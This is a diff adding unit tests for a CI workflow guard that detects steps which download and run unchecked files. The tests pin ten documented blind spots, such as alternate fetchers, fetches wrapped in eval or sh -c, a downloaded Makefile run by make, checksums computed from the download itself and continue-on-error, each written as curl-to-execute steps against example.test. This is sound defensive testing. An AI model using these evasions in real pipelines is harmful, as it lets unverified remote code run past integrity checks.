@@ -695,6 +695,123 @@ class TestAnUnparseableShellIsNotAPass(unittest.TestCase):
         self.assertEqual("sh", wg.run_jobs(doc)[0][1][0].shell)
 
 
+# --- #1697: the documented gap list, as executable pins -----------------------
+# The module docstring names ten forms this guard does not model. A list of
+# fail-open forms written only in prose ROTS: a form that starts being caught
+# keeps its entry, a form that stops being caught gains none, and either way
+# the list stops describing the control. So each of the ten runs here, through
+# `job_defects`, in the smallest step that spells it -- and the assertion is
+# the current answer, whatever that answer is.
+#
+# Every one of them is accepted today; #1697 is the pass that decides, form by
+# form, which of them the guard can reach and must therefore flag.
+
+
+class TestTheGapsTheGuardDocuments(unittest.TestCase):
+    """#1697: the ten forms the module docstring lists, each as a live step."""
+
+    def accepted(self, *steps):
+        """The job is clean today -- this form goes unseen."""
+        found = wg.job_defects(list(steps))
+        self.assertEqual([], found, found)
+
+    # 1. a fetcher that is not curl/wget.
+    def test_a_fetcher_that_is_not_curl_or_wget(self):
+        for fetch in ("gh release download v1.2.3 -O /tmp/payload\n",
+                      "aws s3 cp s3://bucket/payload /tmp/payload\n"):
+            self.accepted(("get", fetch), ("run", "chmod +x /tmp/payload\n"))
+
+    # 2. variable expansion: the same file under two spellings.
+    def test_a_destination_spelled_one_way_and_used_another(self):
+        self.accepted(("get", 'DEST=/tmp/payload\n'
+                              'curl -sfL https://example.test/p -o "$DEST"\n'),
+                      ("run", "chmod +x /tmp/payload\n/tmp/payload\n"))
+
+    # 3. what runs inside a container.
+    def test_what_a_container_runs_is_one_command_to_this_parser(self):
+        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/x.sh\n"),
+                      ("run", "docker run --rm -v /tmp:/w img bash /w/x.sh\n"))
+
+    # 4. bytes modified after a passing check.
+    def test_bytes_modified_after_a_passing_check(self):
+        self.accepted(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
+                      ("check", 'echo "%s  /tmp/p" | sha256sum -c -\n' % HEX),
+                      ("run", "sed -i s/a/b/ /tmp/p\nchmod +x /tmp/p\n/tmp/p\n"))
+
+    # 5. a chmod over a glob -- and over a directory, which is the same act.
+    def test_a_chmod_over_a_glob_binds_nothing(self):
+        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/d/x.sh\n"),
+                      ("run", "chmod +x /tmp/d/*.sh\n"))
+
+    def test_a_recursive_chmod_over_the_directory_binds_nothing(self):
+        self.accepted(("get", "curl -sfL https://example.test/x.sh -o /tmp/d/x.sh\n"),
+                      ("run", "chmod -R +x /tmp/d\n"))
+
+    # 6. a fetch inside an `eval` STRING (not a substitution).
+    def test_a_fetch_inside_an_eval_string(self):
+        self.accepted(("get", 'eval "curl -sfL https://example.test/p -o /tmp/p"\n'),
+                      ("run", "chmod +x /tmp/p\n/tmp/p\n"))
+
+    def test_a_fetch_inside_a_sh_dash_c_string(self):
+        self.accepted(("get", 'sh -c "curl -sfL https://example.test/p -o /tmp/p"\n'),
+                      ("run", "chmod +x /tmp/p\n/tmp/p\n"))
+
+    # 7. an executor that reads the file by convention, not by argument.
+    def test_an_executor_that_reads_the_file_by_convention(self):
+        self.accepted(("get", "curl -sfL https://example.test/m -o Makefile\n"),
+                      ("run", "make\n"))
+        self.accepted(("get", "curl -sfL https://example.test/p -o package.json\n"),
+                      ("run", "npm install\n"))
+
+    # 8. a digest computed from the download itself.
+    def test_a_digest_computed_from_the_download_itself(self):
+        self.accepted(
+            ("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
+            ("check", 'SHA="$(sha256sum /tmp/p | cut -d\' \' -f1)"\n'
+                      'echo "$SHA  /tmp/p" | sha256sum -c -\n'),
+            ("run", "chmod +x /tmp/p\n/tmp/p\n"))
+
+    def test_a_sums_file_the_step_computed_from_the_download_is_already_caught(self):
+        # The other spelling of the same theatre, and this half is NOT a gap:
+        # the recorded text is `sha256sum /tmp/p`, which carries no digest.
+        found = wg.job_defects(
+            [("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
+             ("check", "sha256sum /tmp/p > /tmp/p.sha\nsha256sum -c /tmp/p.sha\n"),
+             ("run", "chmod +x /tmp/p\n")])
+        self.assertEqual(1, len(found), found)
+
+    # 9. `find -exec` and `xargs` operands.
+    def test_a_find_exec_operand_binds_nothing(self):
+        self.accepted(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
+                      ("run", r"find /tmp -name p -exec chmod +x {} \;" "\n"))
+
+    def test_an_xargs_operand_binds_nothing(self):
+        self.accepted(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
+                      ("run", "echo /tmp/p | xargs chmod +x\n"))
+
+    # 10. the `if:` comparison, and its YAML twin of `|| true`.
+    def test_a_check_step_carrying_continue_on_error(self):
+        # `continue-on-error: true` is the YAML twin of `|| true`: the step
+        # fails and the job carries on. Read through the document, because the
+        # field is YAML the guard already has in hand.
+        doc = {"jobs": {"b": {"steps": [
+            {"name": "get", "run": "curl -sfL https://example.test/p -o /tmp/p\n"},
+            {"name": "check", "continue-on-error": True,
+             "run": 'echo "%s  /tmp/p" | sha256sum -c -\n' % HEX},
+            {"name": "run", "run": "chmod +x /tmp/p\n/tmp/p\n"}]}}}
+        self.accepted(*wg.run_steps(doc))
+
+    def test_a_condition_compared_as_written_is_assumed_stable(self):
+        # `env.NEED` is rewritten between the two steps, so the SAME text is
+        # not the same answer -- but the guard compares the text.
+        when = "env.NEED == 'yes'"
+        self.accepted(
+            wg.Step("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
+            wg.Step("check", 'echo "%s  /tmp/p" | sha256sum -c -\n' % HEX, None, when),
+            wg.Step("flip", 'echo "NEED=no" >> "$GITHUB_ENV"\n'),
+            wg.Step("run", "chmod +x /tmp/p\n/tmp/p\n", None, when))
+
+
 class TestRunSteps(unittest.TestCase):
     """The reader the repo-wide rule and the CLI share."""
 
